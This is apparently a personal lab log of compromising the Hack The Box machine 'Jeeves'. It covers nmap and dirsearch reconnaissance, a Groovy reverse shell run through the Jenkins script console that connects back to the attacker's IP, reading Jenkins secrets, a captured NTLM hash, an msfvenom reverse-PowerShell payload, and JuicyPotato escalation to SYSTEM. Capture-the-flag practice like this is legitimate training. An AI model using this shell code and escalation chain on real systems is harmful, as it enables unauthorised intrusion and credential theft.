
```
Jeeves HTB - crushed this box
IP:10.10.10.63
```

```
7:10 PM 1/17/2023
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV 10.10.10.63 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 00:11 EST
Nmap scan report for 10.10.10.63
Host is up (0.15s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0															# microsof
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-01-18T10:11:22
|_  start_date: 2023-01-17T22:56:01
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.34 seconds


http://www.10.10.10.63:50000/vci/downloads/.\..\..\..\..\..\..\..\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\SSL\rui.key 			## did not work

http://www.10.10.10.63:50000/.\..\..\..\..\..\..\..\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\SSL\rui.key 							## did not work
```

```
7:31 PM 1/17/2023
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L \\\\10.10.10.63 -N          
session setup failed: NT_STATUS_ACCESS_DENIED																															## nothing here.


tried burpsuite, nothing..

dirsearch -u http://10.10.10.63:50000 -t 100 -e php,gzip,tar,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r

┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.10.10.63:50000 -t 100 -e php,gzip,tar,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, gzip, tar, txt | HTTP method: GET | Threads: 100 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.10.10.63-50000/_23-01-18_00-47-11.txt

Error Log: /root/.dirsearch/logs/errors-23-01-18_00-47-11.log

Target: http://10.10.10.63:50000/

[00:47:11] Starting: 
[00:48:55] 302 -    0B  - /askjeeves  ->  http://10.10.10.63:50000/askjeeves/     (Added to queue)
[00:59:40] Starting: askjeeves/
[00:59:42] 302 -    0B  - /askjeeves/projects  ->  http://10.10.10.63:50000/askjeeves/projects/     (Added to queue)
[00:59:42] 302 -    0B  - /askjeeves/security  ->  http://10.10.10.63:50000/askjeeves/security/     (Added to queue)
[00:59:43] 302 -    0B  - /askjeeves/about  ->  http://10.10.10.63:50000/askjeeves/about/     (Added to queue)
[00:59:43] 200 -   11KB - /askjeeves/index
[00:59:43] 200 -   11KB - /askjeeves/login
[00:59:43] 302 -    0B  - /askjeeves/people  ->  http://10.10.10.63:50000/askjeeves/people/     (Added to queue)
[00:59:44] 302 -    0B  - /askjeeves/search  ->  http://10.10.10.63:50000/askjeeves/search/     (Added to queue)
[00:59:44] 500 -   15KB - /askjeeves/main
[00:59:44] 302 -    0B  - /askjeeves/assets  ->  http://10.10.10.63:50000/askjeeves/assets/     (Added to queue)
[00:59:45] 302 -    0B  - /askjeeves/version  ->  http://10.10.10.63:50000/askjeeves/version/     (Added to queue)
[00:59:46] 302 -    0B  - /askjeeves/columns  ->  http://10.10.10.63:50000/askjeeves/columns/     (Added to queue)
[00:59:47] 302 -    0B  - /askjeeves/computers  ->  http://10.10.10.63:50000/askjeeves/computers/     (Added to queue)
[00:59:47] 302 -    0B  - /askjeeves/log  ->  http://10.10.10.63:50000/askjeeves/log/     (Added to queue)
[00:59:48] 302 -    0B  - /askjeeves/computer  ->  http://10.10.10.63:50000/askjeeves/computer/     (Added to queue)
[00:59:51] 302 -    0B  - /askjeeves/api  ->  http://10.10.10.63:50000/askjeeves/api/     (Added to queue)
[00:59:51] 403 -  589B  - /askjeeves/me
[00:59:52] 302 -    0B  - /askjeeves/timeline  ->  http://10.10.10.63:50000/askjeeves/timeline/     (Added to queue)
[00:59:52] 302 -    0B  - /askjeeves/channel  ->  http://10.10.10.63:50000/askjeeves/channel/     (Added to queue)
[00:59:52] 302 -    0B  - /askjeeves/logout  ->  http://10.10.10.63:50000/askjeeves/
[00:59:53] 302 -    0B  - /askjeeves/items  ->  http://10.10.10.63:50000/askjeeves/items/     (Added to queue)
[00:59:53] 302 -    0B  - /askjeeves/url  ->  http://10.10.10.63:50000/askjeeves/url/     (Added to queue)
[00:59:58] 302 -    0B  - /askjeeves/lookup  ->  http://10.10.10.63:50000/askjeeves/lookup/     (Added to queue)
[01:00:00] 200 -   12KB - /askjeeves/script
[01:00:02] 302 -    0B  - /askjeeves/class  ->  http://10.10.10.63:50000/askjeeves/class/     (Added to queue)
[01:00:02] 302 -    0B  - /askjeeves/widgets  ->  http://10.10.10.63:50000/askjeeves/widgets/     (Added to queue)
[01:00:04] 302 -    0B  - /askjeeves/authentication  ->  http://10.10.10.63:50000/askjeeves/authentication/     (Added to queue)
[01:00:07] 302 -    0B  - /askjeeves/root  ->  http://10.10.10.63:50000/askjeeves/root/     (Added to queue)
[01:00:10] 200 -   19KB - /askjeeves/manage
[01:00:15] 400 -    7KB - /askjeeves/error
[01:00:16] 405 -  194B  - /askjeeves/gc
[01:00:17] 405 -  196B  - /askjeeves/eval
[01:00:18] 302 -    0B  - /askjeeves/views  ->  http://10.10.10.63:50000/askjeeves/views/     (Added to queue)
[01:00:25] 302 -    0B  - /askjeeves/actions  ->  http://10.10.10.63:50000/askjeeves/actions/     (Added to queue)
[01:00:29] 302 -    0B  - /askjeeves/target  ->  http://10.10.10.63:50000/askjeeves/target/     (Added to queue)
[01:00:39] 405 -  196B  - /askjeeves/exit
[01:00:39] 302 -    0B  - /askjeeves/labels  ->  http://10.10.10.63:50000/askjeeves/labels/     (Added to queue)
[01:00:56] 302 -    0B  - /askjeeves/properties  ->  http://10.10.10.63:50000/askjeeves/properties/     (Added to queue)
[01:01:09] 200 -   20KB - /askjeeves/builds
[01:01:20] 200 -   11KB - /askjeeves/delete
[01:01:24] 302 -    0B  - /askjeeves/mode  ->  http://10.10.10.63:50000/askjeeves/mode/     (Added to queue)
[01:01:37] 302 -    0B  - /askjeeves/git  ->  http://10.10.10.63:50000/askjeeves/git/     (Added to queue)
[01:01:49] 302 -    0B  - /askjeeves/i18n  ->  http://10.10.10.63:50000/askjeeves/i18n/     (Added to queue)
[01:02:05] 500 -    9KB - /askjeeves/oops
[01:02:06] 200 -   14KB - /askjeeves/legend
[01:02:11] 302 -    0B  - /askjeeves/subversion  ->  http://10.10.10.63:50000/askjeeves/subversion/     (Added to queue)
[01:02:40] 302 -    0B  - /askjeeves/lifecycle  ->  http://10.10.10.63:50000/askjeeves/lifecycle/     (Added to queue)
[01:03:23] 302 -    0B  - /askjeeves/owner  ->  http://10.10.10.63:50000/askjeeves/owner/     (Added to queue)
[01:03:39] 401 -    0B  - /askjeeves/secured
[01:04:44] 302 -    0B  - /askjeeves/nodes  ->  http://10.10.10.63:50000/askjeeves/nodes/     (Added to queue)
[01:05:40] 302 -    0B  - /askjeeves/cli  ->  http://10.10.10.63:50000/askjeeves/cli/     (Added to queue)
[01:06:58] 302 -    0B  - /askjeeves/queue  ->  http://10.10.10.63:50000/askjeeves/queue/     (Added to queue)
[01:08:55] 405 -  198B  - /askjeeves/reload
[01:09:06] 302 -    0B  - /askjeeves/clouds  ->  http://10.10.10.63:50000/askjeeves/clouds/     (Added to queue)
CTRL+C detected: Pausing threads, please wait...

Canceled by the user
```

```
8:13 PM 1/17/2023
http://10.10.10.63:50000/askjeeves/script																						# place to inset scripts on jetty server, setup netcat listener on machine and used osr code below and hit run and got a shell.
```

```
String host="10.10.16.21";																										# GROOVY REVERSE SHELL
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```
8:15 PM 1/17/2023
netcat -lvnp 4444

┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4444           
listening on [any] 4444 ...
connect to [10.10.16.21] from (UNKNOWN) [10.10.10.63] 49719
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>history
history
'history' is not recognized as an internal or external command,
operable program or batch file.
```

```
8:17 PM 1/17/2023
C:\Users\Administrator\.jenkins\secrets>type initialAdminPassword
type initialAdminPassword
ccd3bc435b3c4f80bea8acca28aec491

c:\Windows\Temp>echo %USERDOMAIN%\%USERNAME%
echo %USERDOMAIN%\%USERNAME%
JEEVES\kohsuke


C:\Users\Administrator\.jenkins\secrets>type master.key
type master.key
40e19a08d55698273e82182aae560bb78f5c99205e1b603de13e4729dfeed0bfaa9ed79557107ca7294a8a18a9bd81d60ee5610943e488bf2150dc1b06935b8f2a4f5b9370e0cb1d28249758e2b96cf2b658f2c5290fc6a202d9a04621c79eb0d09faf3246e50998a0aaea42b76eb96186f4842e0f9c07bbbd77152afc59de16

C:\Users\Administrator\.jenkins\secrets>systeminfo
systeminfo

Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          1/17/2023, 5:55:49 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 974 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,566 MB
Virtual Memory: In Use:    1,121 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.63
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```
8:23 PM 1/17/2023																																	# testing to see if i can transfer files
c:\Windows\Temp>certutil -urlcache -f http://10.10.16.21:8000/test.txt test.txt
certutil -urlcache -f http://10.10.16.21:8000/test.txt test.txt
'certutil' is not recognized as an internal or external command,
operable program or batch file.

c:\Windows\Temp>
```

```
8:24 PM 1/17/2023																																	# trying smb server
smbmap -u Admin -p ccd3bc435b3c4f80bea8acca28aec491 -H 10.10.10.63    
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# smbmap -u Admin -p ccd3bc435b3c4f80bea8acca28aec491 -H 10.10.10.63
[!] Authentication error on 10.10.10.63
```

```
8:28 PM 1/17/2023
c:\Windows\Temp>systeminfo | findstr /B /C:"OS Version" /C:"System Type" /C:"OS Name"
systeminfo | findstr /B /C:"OS Version" /C:"System Type" /C:"OS Name"
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
System Type:               x64-based PC

c:\Windows\Temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 																	# impersonate, bingo
SeCreateGlobalPrivilege       Create global objects                     Enabled 																	# could be of interest
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

```
8:43 PM 1/17/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]																										# downloaded rottenpotato.exe  and hosted smb transfer to xfer file to windows box.
└─# smbserver.py TMP /home/kali/Documents/transfer -smb2support
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.63,49723)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User JEEVES\kohsuke authenticated successfully
[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:9a25d72550efe541bdb22826e523d8be:01010000000000000030440f082bd90121eaa5efa6f4b5600000000001001000560064007500660049006a004600490003001000560064007500660049006a0046004900020010006f00560056007a005900450046007a00040010006f00560056007a005900450046007a00070008000030440f082bd90106000400020000000800300030000000000000000000000000300000f4c8f1f67dc5cd4c3ba7309936d0fd20256daf74e7f4e195366f1972a53963a70a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0032003100000000000000000000000000
[*] Connecting Share(1:TMP)
[*] Disconnecting Share(1:TMP)
[*] Closing down connection (10.10.10.63,49723)
[*] Remaining connections []
^CTraceback (most recent call last):
  File "/usr/local/bin/smbserver.py", line 105, in <module>
    server.start()
  File "/usr/local/lib/python3.10/dist-packages/impacket/smbserver.py", line 4889, in start
    self.__server.serve_forever()
  File "/usr/lib/python3.10/socketserver.py", line 232, in serve_forever
    ready = selector.select(poll_interval)
  File "/usr/lib/python3.10/selectors.py", line 416, in select
    fd_event_list = self._selector.poll(timeout)
KeyboardInterrupt
```

```
8:44 PM 1/17/2023
C:\Users\kohsuke\Desktop>copy \\10.10.16.21\TMP\rottenpotato.exe																					# copied rottenpotato.exe
copy \\10.10.16.21\TMP\rottenpotato.exe
        1 file(s) copied.

C:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Desktop

01/18/2023  06:42 AM    <DIR>          .
01/18/2023  06:42 AM    <DIR>          ..
01/18/2023  01:40 AM           679,936 rottenpotato.exe
11/03/2017  10:22 PM                32 user.txt
               2 File(s)        679,968 bytes
               2 Dir(s)   2,665,701,376 bytes free

C:\Users\kohsuke\Desktop>
```

```
8:45 PM 1/17/2023																																	# user.txt
C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a
```

```
8:57 PM 1/17/2023
C:\Users\kohsuke\Desktop>copy \\10.10.16.21\TMP\juicypotato.exe
c:\Users\kohsuke\Desktop>copy \\10.10.16.21\TMP\juicypotato.exe
copy \\10.10.16.21\TMP\juicypotato.exe
        1 file(s) copied.

c:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\kohsuke\Desktop																																	# had to upload juicy potato due to rotten potato being wrong one.

01/18/2023  06:53 AM    <DIR>          .
01/18/2023  06:53 AM    <DIR>          ..
01/18/2023  01:51 AM           347,648 juicypotato.exe
01/18/2023  01:40 AM           679,936 rottenpotato.exe
11/03/2017  10:22 PM                32 user.txt
               3 File(s)      1,027,616 bytes
               2 Dir(s)   2,572,713,984 bytes free

c:\Users\kohsuke\Desktop>powershell -executionpolicy bypass -file getCLSID.ps1 > clsid.txt
powershell -executionpolicy bypass -file getCLSID.ps1 > clsid.txt
The argument 'getCLSID.ps1' to the -File parameter does not exist. Provide the path to an existing '.ps1' file as an argument to the -File parameter.

c:\Users\kohsuke\Desktop>
```

```
8:58 PM 1/17/2023
https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/																															# looking up clsid to mask as for juicy potato

WSearch	{9E175B9C-F52A-11D8-B9A5-505054503030}
```

```
9:03 PM 1/17/2023
msfvenom -p cmd/windows/reverse_powershell lhost=10.10.16.21 lport=5555 > shell.bat																							made reverse_powershell payload with msfvenom
┌──(root㉿kali)-[/home/kali/Documents/transfer/msfvenom]
└─# ls
exploit.aspx  manual1.aspx  shell.bat
                                                                                                                                                                                                                                            
```

```
9:05 PM 1/17/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer/msfvenom]																											# copied shell.bat  to transfer folder
└─# cp shell.bat /home/kali/Documents/transfer/shell.bat
```

```
9:03 PM 1/17/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]																											# hosting an additional smb server to put payload on victim machine.
└─# smbserver.py TMP /home/kali/Documents/transfer -smb2support
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```
9:06 PM 1/17/2023																																			
c:\Users\kohsuke\Desktop>copy \\10.10.16.21\TMP\shell.bat																						# copied shell.bat over.
copy \\10.10.16.21\TMP\shell.bat
        1 file(s) copied.

c:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\kohsuke\Desktop

01/18/2023  07:06 AM    <DIR>          .
01/18/2023  07:06 AM    <DIR>          ..
01/18/2023  06:55 AM                 0 clsid.txt
01/18/2023  01:51 AM           347,648 juicypotato.exe
01/18/2023  01:40 AM           679,936 rottenpotato.exe
01/18/2023  02:05 AM             1,584 shell.bat
11/03/2017  10:22 PM                32 user.txt
               5 File(s)      1,029,200 bytes
               2 Dir(s)   2,572,640,256 bytes free
```

```
9:07 PM 1/17/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]																								# setup an additional listener for shell.bat port 555
└─# nc -lvnp 5555
listening on [any] 5555 ...
```

```
9:09 PM 1/17/2023
c:\Users\kohsuke\Desktop>juicypotato.exe -t * -p shell.bat -l 5555																			# executing juicy potato on victim machine.
juicypotato.exe -t * -p shell.bat -l 5555
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 5555
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\kohsuke\Desktop>
```

```
9:09 PM 1/17/2023																															# back on netcat, caught callback, system privileges gg
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.21] from (UNKNOWN) [10.10.10.63] 49740
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```
9:10 PM 1/17/2023
c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
c:\Users\Administrator\Desktop>
```


